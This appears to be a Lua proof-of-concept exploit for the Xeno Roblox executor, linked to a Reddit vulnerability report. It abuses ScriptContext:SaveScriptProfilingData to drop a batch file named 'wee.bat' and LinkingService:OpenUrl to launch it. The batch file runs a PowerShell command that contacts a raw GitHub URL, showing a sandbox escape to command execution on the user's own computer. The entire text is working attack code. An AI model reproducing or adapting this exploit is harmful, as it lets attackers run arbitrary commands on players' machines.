j=[[@echo off
powershell -c "Invoke-RestMethod 'https://raw.githubusercontent.com/buhhhhg/RobloxScriptz/refs/heads/main/4.txt'"
pause]]

-- https://www.reddit.com/r/robloxhackers/comments/1ilizc9/xeno_is_vulnerable_and_they_ignored_me
local unwrappedGame, s, r
unwrappedGame = workspace.Parent
s,r=pcall(function()unwrappedGame.LinkingService:OpenUrl(unwrappedGame:GetService("ScriptContext"):SaveScriptProfilingData(j,"wee.bat"))end)

if not s then
    print(tostring(s), tostring(r))
local p = Instance.new("Part", workspace)
unwrappedGame = p:FindFirstAncestorWhichIsA("DataModel")
s,r=pcall(function()unwrappedGame.LinkingService:OpenUrl(unwrappedGame:GetService("ScriptContext"):SaveScriptProfilingData(j,"wee.bat"))end)
p:Destroy()
end
  
if not s then
  print(tostring(s), tostring(r))
  unwrappedGame = script:FindFirstAncestorWhichIsA("DataModel")
  s,r=pcall(function()unwrappedGame.LinkingService:OpenUrl(unwrappedGame:GetService("ScriptContext"):SaveScriptProfilingData(j,"wee.bat"))end)
end
